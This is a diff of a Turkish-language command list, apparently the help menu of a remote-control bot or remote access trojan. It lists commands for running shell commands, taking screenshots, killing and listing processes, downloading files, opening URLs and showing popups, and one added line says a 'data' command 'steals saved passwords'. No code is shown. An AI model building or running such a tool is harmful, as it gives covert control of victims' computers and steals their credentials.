@@ -1,11 +1,16 @@
 start - Açılış, Bilgi Alma
-sistem - Bulunduğunuz Sistem Hakkında Bilgi Verir
-url - domain.com | Chrome'dan Link Açar
-oldur - chrome.exe | İşlem Sonlandırır
-data - Kullanıcı Dataları
-ekran - Anlık Ekran Görüntüsü Verir
-pwd - Geçerli Dizini Gösterir
-ls - Bulunulan Dizini Listeler
-cd - Dizin Değiştirir
-rmdir - Dizin Siler
-indir - Dosya İndirir
+komut - Komutları Listeler
+bip - 4 saniye çevirmeli bağlantı sesi
+cd - change directory
+cmd - [komut] çalıştırır
+data - kayıtlı şifreleri çalar
+ekran - screen shot
+hata - [metin] uyarı penceresi gönderir
+indir - [dosya] indirir
+islemler - aktif işlemleri listeler
+ls - geçerli dizini listeler
+oldur - [islem.exe] sonlandırır
+pwd - print working directory
+rmdir - remove directory
+sistem - sistem hakkında bilgi verir
+url - [url] chrome'da açtırır
